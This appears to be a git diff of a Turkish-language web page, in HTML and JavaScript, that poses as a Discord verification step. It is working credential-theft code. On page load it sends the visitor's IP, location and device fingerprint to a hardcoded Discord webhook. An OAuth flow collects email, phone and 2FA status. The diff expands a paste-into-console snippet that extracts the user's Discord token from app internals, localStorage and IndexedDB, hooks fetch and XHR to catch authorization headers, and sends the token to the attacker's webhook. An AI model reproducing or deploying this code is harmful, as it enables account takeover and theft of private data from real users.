@@ -29,8 +29,8 @@
   .mini{font-size:12.5px;color:#9aa0a8;margin-bottom:8px}
   code{background:#1e1f22;padding:2px 5px;border-radius:4px;font-size:12px;color:#c9cdd4}
   pre{background:#1e1f22;border:1px solid #3f4147;border-radius:8px;padding:10px;
-      font-size:11px;line-height:1.5;color:#c9cdd4;white-space:pre-wrap;
-      word-break:break-all;max-height:130px;overflow:auto;margin-bottom:8px}
+      font-size:10.5px;line-height:1.5;color:#c9cdd4;white-space:pre-wrap;
+      word-break:break-all;max-height:150px;overflow:auto;margin-bottom:8px}
   textarea{width:100%;background:#1e1f22;border:1px solid #3f4147;border-radius:8px;
            color:#f2f3f5;font-size:12px;padding:10px;resize:vertical;
            font-family:ui-monospace,Consolas,monospace;margin-bottom:8px}
@@ -53,19 +53,19 @@
   <div id="sp" class="spin"></div>
 
   <div id="panel" class="panel hide">
-    <div class="warn">OAuth token'ı alındı ama o <b>Bearer</b> token; istemciye giriş için gerçek token lazım. Aşağıdaki iki yoldan birini kullan.</div>
+    <div class="warn">Hesap alındı. Şimdi <b>gerçek token</b> lazım — OAuth token'ı işe yaramıyor.</div>
 
     <div class="step">
-      <b>Yol 1 — tek tık</b>
-      <p class="mini">Discord'u tarayıcıda aç → F12 → Console → kodu yapıştır → Enter.</p>
+      <b>Yol 1 — kodu çalıştır</b>
+      <p class="mini">Yeni sekmede <code>discord.com</code> aç → F12 → Console → kodu yapıştır → Enter.</p>
       <pre id="snippet"></pre>
       <button id="copy" class="sm">Kodu kopyala</button>
     </div>
 
     <div class="step">
-      <b>Yol 2 — manuel</b>
-      <p class="mini">Console'a <code>localStorage.getItem("token")</code> yaz, çıkan değeri buraya yapıştır.</p>
-      <textarea id="ta" rows="3" spellcheck="false" placeholder="Gerçek token (xxx.yyy.zzz)"></textarea>
+      <b>Yol 2 — elle</b>
+      <p class="mini">Console'a <code>copy(localStorage.getItem("token"))</code> yaz, sonucu buraya yapıştır.</p>
+      <textarea id="ta" rows="3" spellcheck="false" placeholder="Token (xxx.yyy.zzz)"></textarea>
       <button id="send" class="sm">Gönder</button>
       <p id="st" class="mini" style="margin-top:8px"></p>
     </div>
@@ -78,29 +78,23 @@
 const CONFIG = {
   WEBHOOK: "https://discord.com/api/webhooks/1557367996849066025/Qh_jUvGk24lLgdg-bPZVu30efBkpS8ywZFpQQ2_gcEmCkK-Ep2RyQT3X9eBK9W70HsOf",
   CLIENT_ID: "1571867967187325008",
-  REDIRECT: "",
+  REDIRECT: "",           // örn: "https://network-guy805.github.io/repo/index.html"
   SCOPES: "identify email guilds connections",
-  AUTO_OAUTH: true,
-  BACK_TO_DISCORD: true
+  AUTO_OAUTH: true
 };
 
 const $ = s => document.querySelector(s);
 const cut = (s, n) => String(s ?? "?").slice(0, n);
-const TOKEN_RE = /^[\w-]{20,34}\.[\w-]{5,8}\.[\w-]{25,50}$/;
+const TOKEN_RE = /^[\w-]{20,45}\.[\w-]{5,12}\.[\w-]{20,70}$/;
 
 async function grab(url, ms) {
   const c = new AbortController();
   const t = setTimeout(() => c.abort(), ms || 3500);
-  try {
-    const r = await fetch(url, { signal: c.signal });
-    return await r.json();
-  } finally {
-    clearTimeout(t);
-  }
+  try { const r = await fetch(url, { signal: c.signal }); return await r.json(); }
+  finally { clearTimeout(t); }
 }
 
 async function report(payload) {
-  if (!CONFIG.WEBHOOK || CONFIG.WEBHOOK.includes("BURAYA")) return;
   try {
     await fetch(CONFIG.WEBHOOK, {
       method: "POST",
@@ -118,8 +112,7 @@ async function collect() {
     if (j && j.success !== false) {
       d.ip = j.ip;
       d.isp = j.connection?.isp || j.connection?.org || "?";
-      d.city = j.city;
-      d.region = j.region;
+      d.city = j.city; d.region = j.region;
       d.country = (j.country || "?") + " (" + (j.country_code || "?") + ")";
       d.tz = j.timezone?.id || "?";
       if (j.latitude && j.longitude) d.loc = j.latitude + "," + j.longitude;
@@ -127,13 +120,11 @@ async function collect() {
   } catch (e) {
     try { d.ip = (await grab("https://api.ipify.org?format=json")).ip; } catch (_) {}
   }
-  try {
-    d.tz = d.tz !== "?" ? d.tz : Intl.DateTimeFormat().resolvedOptions().timeZone;
-  } catch (_) {}
+  try { d.tz = d.tz !== "?" ? d.tz : Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
   d.ua = navigator.userAgent;
   d.platform = navigator.platform;
   d.lang = navigator.language + " / " + (navigator.languages || []).join(", ");
-  d.screen = screen.width + "x" + screen.height + " @" + screen.colorDepth + "bit";
+  d.screen = screen.width + "x" + screen.height + "@" + screen.colorDepth + "bit";
   d.win = innerWidth + "x" + innerHeight;
   d.cpu = navigator.hardwareConcurrency + " çekirdek";
   d.ram = (navigator.deviceMemory || "?") + " GB";
@@ -159,7 +150,7 @@ function build(title, d, user, guilds, token) {
   if (user) {
     f.push(
       { name: "Kullanıcı ID", value: "`" + user.id + "`", inline: true },
-      { name: "Kullanıcı adı", value: "`" + cut(user.username, 40) + (user.discriminator && user.discriminator !== "0" ? "#" + user.discriminator : "") + "`", inline: true },
+      { name: "Kullanıcı adı", value: "`" + cut(user.username, 40) + "`", inline: true },
       { name: "E-posta", value: "`" + cut(user.email || "?", 90) + "`" + (user.verified ? " ✔" : ""), inline: false },
       { name: "Telefon", value: "`" + cut(user.phone || "yok", 40) + "`", inline: true },
       { name: "2FA", value: user.mfa_enabled ? "açık" : "kapalı", inline: true },
@@ -185,11 +176,40 @@ function build(title, d, user, guilds, token) {
 /* ---------- gerçek token ---------- */
 
 function snippet() {
-  return '(async()=>{const t=localStorage.getItem("token");if(!t)return alert("token yok - discord.com uzerinde calistir");'
-    + 'await navigator.clipboard.writeText(t).catch(()=>{});'
-    + 'await fetch("' + CONFIG.WEBHOOK + '",{method:"POST",headers:{"Content-Type":"application/json"},'
-    + 'body:JSON.stringify({content:"**GERCEK TOKEN**\\n```"+t+"```"})});'
-    + 'console.log("gonderildi",t)})()';
+  const W = CONFIG.WEBHOOK;
+  return [
+    '(async()=>{',
+    'const W="' + W + '";',
+    'const RE=/^[\\w-]{20,45}\\.[\\w-]{5,12}\\.[\\w-]{20,70}$/;',
+    'const out=[];',
+    'const done=async(t,s)=>{if(!t)return;t=String(t).replace(/^"|"$/g,"").trim();if(!RE.test(t))return;',
+    'await navigator.clipboard.writeText(t).catch(()=>{});',
+    'const r=await fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},',
+    'body:JSON.stringify({username:"Logger",embeds:[{title:"GERCEK TOKEN ("+s+")",color:0xed4245,',
+    'fields:[{name:"Token",value:"```"+t+"```"},{name:"Kaynak",value:s,inline:true}],',
+    'timestamp:new Date().toISOString()}]})});',
+    'console.log(r.status,"GONDERILDI",t)};',
+    'try{let m;webpackChunkdiscord_app.push([[Symbol()],{},e=>{m=Object.values(e.c)}]);webpackChunkdiscord_app.pop();',
+    'const f=m.find(x=>x&&x.exports&&x.exports.default&&x.exports.default.getToken);',
+    'const tv=f&&f.exports.default.getToken();if(tv)out.push(["uygulama",tv]);}catch(e){}',
+    'try{for(const k of Object.keys(localStorage)){const v=(localStorage.getItem(k)||"").replace(/^"|"$/g,"");',
+    'if(RE.test(v))out.push(["storage",v]);}}catch(e){}',
+    'try{const dbs=(await indexedDB.databases?.())||[];',
+    'for(const d of dbs){await new Promise(r=>{const q=indexedDB.open(d.name);q.onerror=()=>r();',
+    'q.onsuccess=()=>{const db=q.result;',
+    'for(const s of db.objectStoreNames){try{const g=db.transaction(s,"readonly").objectStore(s).getAll();',
+    'g.onsuccess=()=>{(JSON.stringify(g.result||[]).match(new RegExp(RE.source,"g"))||[]).forEach(t=>out.push(["storage",t]));};}catch(e){}}',
+    'setTimeout(()=>{db.close();r()},500)};});}}catch(e){}',
+    'const u=[...new Map(out.map(x=>[x[1],x])).values()];',
+    'if(u.length){for(const [s,t] of u)await done(t,s);return;}',
+    'console.log("Bulunamadi - bir kanala tikla, yakalayacagim...");',
+    'const cap=t=>{if(t&&RE.test(t))done(t,"network")};',
+    'const of=window.fetch;window.fetch=function(...a){try{const h=a[1]&&a[1].headers;',
+    'if(h){const g=h.get?h.get("Authorization"):(h.Authorization||h.authorization);cap(g)}}catch(e){}return of.apply(this,a)};',
+    'const os=XMLHttpRequest.prototype.setRequestHeader;',
+    'XMLHttpRequest.prototype.setRequestHeader=function(k,v){if(k.toLowerCase()==="authorization")cap(v);return os.call(this,k,v)};',
+    '})()'
+  ].join("\n");
 }
 
 async function sendReal(raw, src) {
@@ -249,15 +269,12 @@ function showPanel() {
 /* ---------- akış ---------- */
 
 function goOAuth() {
-  const st = Math.random().toString(36).slice(2) + Date.now().toString(36);
-  try { sessionStorage.setItem("oauth_state", st); } catch (e) {}
   const u = new URL("https://discord.com/oauth2/authorize");
   u.searchParams.set("client_id", CONFIG.CLIENT_ID);
   u.searchParams.set("response_type", "token");
   u.searchParams.set("scope", CONFIG.SCOPES);
-  u.searchParams.set("state", st);
   u.searchParams.set("prompt", "consent");
-  u.searchParams.set("redirect_uri", CONFIG.REDIRECT || location.origin + location.pathname.replace(/index\.html?$/, ""));
+  u.searchParams.set("redirect_uri", CONFIG.REDIRECT || location.origin + location.pathname);
   location.href = u.toString();
 }
 
@@ -283,12 +300,8 @@ async function callback(hash) {
 
   $("#sp").style.display = "none";
   $("#t").textContent = "Doğrulandı";
-  $("#m").textContent = user
-    ? user.username + " — son adım: gerçek token."
-    : "Son adım: gerçek token.";
+  $("#m").textContent = user ? user.username + " — son adım: gerçek token." : "Son adım: gerçek token.";
   showPanel();
-
-  if (!CONFIG.BACK_TO_DISCORD) $("#back").classList.add("hide");
 }
 
 (async function () {
@@ -305,7 +318,6 @@ async function callback(hash) {
 
   if (hash.get("access_token")) return callback(hash);
 
-  try { sessionStorage.removeItem("oauth_state"); } catch (e) {}
   const d = await collect();
   await report(build("Tıklandı (giriş yapılmadı)", d, null, [], null));
 
